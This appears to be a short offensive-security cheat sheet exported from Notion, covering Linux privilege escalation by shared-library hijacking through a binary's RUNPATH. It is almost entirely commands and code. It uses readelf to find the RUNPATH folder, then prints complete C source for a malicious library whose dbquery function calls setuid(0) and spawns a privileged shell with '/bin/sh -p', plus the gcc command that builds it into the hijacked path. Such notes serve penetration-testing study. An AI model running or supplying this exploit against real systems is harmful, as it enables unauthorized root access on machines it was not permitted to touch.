# Linux: Check Runpath for library locations and hijack method calls

OS: Linux
Description: Linux: Check Runpath for libaray locations
Security Domains: Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21)
Target_Technology: Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)

### Check for RUNPATH library locations

```jsx
readelf -d BINARY  | grep PATH
```

- Assume [libshared.so](http://libshared.so) is the library found
- assume ‘development’ is the RUNPATH folder found

```jsx
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
```

### Run the binary and identify the function that is in question

```jsx
./BINARY
```

- assume it complains about dbquery

```jsx
#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 
```

```jsx
gcc src.c -fPIC -shared -o /development/libshared.so
```